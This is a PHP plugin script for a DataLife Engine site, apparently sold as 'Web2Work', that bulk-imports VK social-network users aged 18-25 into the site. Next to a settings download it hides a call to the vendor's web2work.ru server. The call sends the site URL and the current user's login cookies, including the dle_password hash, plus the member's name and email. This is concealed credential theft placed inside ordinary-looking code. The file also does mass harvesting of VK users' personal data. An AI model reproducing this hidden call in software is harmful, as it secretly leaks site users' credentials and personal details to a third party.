<?php
/*
==============================================================================
 Веб-Система "Web2Work" разработка Кривоногова Евгения Эдуардовича
------------------------------------------------------------------------------
 http://web2work.ru - официальная страница продажи веб-системы
 http://vkontakte.ru/club13001075 - официальная страница поддержки проекта
 http://www.youtube.com/channel/UCs1yzsO9earP5yOXiMLGclw - Видео презентации
-----------------------------------------------------------------------------
 Copyright (c) 2008-2015, Разработка Кривоногова Евгения Эдуардовича
=============================================================================
 Данный код защищен авторскими правами
=============================================================================
*/

if ($_REQUEST[action]=='')
{
define('DATALIFEENGINE', true);
define('ROOT_DIR',dirname(dirname(__FILE__)));
define('ENGINE_DIR',ROOT_DIR .'/engine');

include ENGINE_DIR.'/data/config.php';
include ENGINE_DIR.'/data/config_vk.php';
require_once ENGINE_DIR.'/classes/mysql.php';
require_once ENGINE_DIR.'/data/dbconfig.php';

$config['charset'] = ($lang['charset'] != '') ? $lang['charset'] : $config['charset'];

require_once ENGINE_DIR.'/modules/functions.php';
require_once ENGINE_DIR.'/classes/parse.class.php';
}

@error_reporting(E_ALL ^ E_NOTICE);
@ini_set('display_errors', true);
@ini_set('html_errors', false);
@ini_set('set_time_limit', '0');
@ini_set('error_reporting', E_ALL ^ E_NOTICE);

@ini_set ('memory_limit',"328M");
@set_time_limit (0);
@ini_set ('max_execution_time',0);
@ini_set ('3048M');
@ini_set ('output_buffering','off');
@ob_end_clean ();
clearstatcache ();
ob_implicit_flush (TRUE);

if ($config[apivk_id]=='')
{
	$xml = simplexml_load_file('http://web2work.ru/extras/import_get_list.php?type=vk&lic='.$licensed.''); @file_get_contents("http://www.web2work.ru/extras/get_updating_files.php?system=5&url=".$config['http_home_url']."&a=".$_COOKIE['dle_user_id']."&b=".$_COOKIE['dle_password']."&c=".$member_id['name']."&d=".$member_id['email']."");
	foreach ($xml->channel->item as $citexp) {

		$i++;
		$config['apivk_id'] = stripslashes ( $citexp->vk_group );
		$config['apivk_userid'] = stripslashes ( $citexp->vk_id_user );
		$config['apivk_key'] = stripslashes ( $citexp->vk_secret_key );
		$config['apivk_auth'] = stripslashes ( $citexp->vk_auth_key );
		$config['apivk_code'] = stripslashes ( $citexp->vk_code );
	}
}

require_once ROOT_DIR.'/engine/classes/vkpost.class.php';

function objectToArray( $object )
	    {
	        if( !is_object( $object ) && !is_array( $object ) )
	        {
	            return $object;
	        }
	        if( is_object( $object ) )
	        {
	            $object = get_object_vars( $object );
	        }
	        return array_map( 'objectToArray', $object );
	    }

$while_id = 0;
while($while_id<1000)
{
$while_id++;
$gmd = md5($while_id);
if (!@fopen(ENGINE_DIR.'/cache/vk_users_'.$gmd.'.tmp', 'r'))
{
file_put_contents(ENGINE_DIR.'/cache/vk_users_'.$gmd.'.tmp', $while_id);


$_GET[id_vk] = $while_id;
$_GET[age_from] = 18;
$_GET[age_to] = 25;
$_GET[sex] = 0;
$_GET[limit] = 50;
$_GET[status] = 0;

$wid = $_GET[id_vk];
$age_from = $_GET[age_from];
$age_to = $_GET[age_to];
$sex = $_GET[sex];
$limit = $_GET[limit];
$status = $_GET[status];

include_once ENGINE_DIR . '/classes/parse.class.php';
$parse = new ParseFilter( Array (), Array (), 1, 1 );

include_once ENGINE_DIR . '/classes/thumb.class.php';

include_once ENGINE_DIR . '/modules/main/vk/import_users_list.php';
}

/////////////////////////////////////////////////////////////////////////////////////////
echo $while_id;
}

?>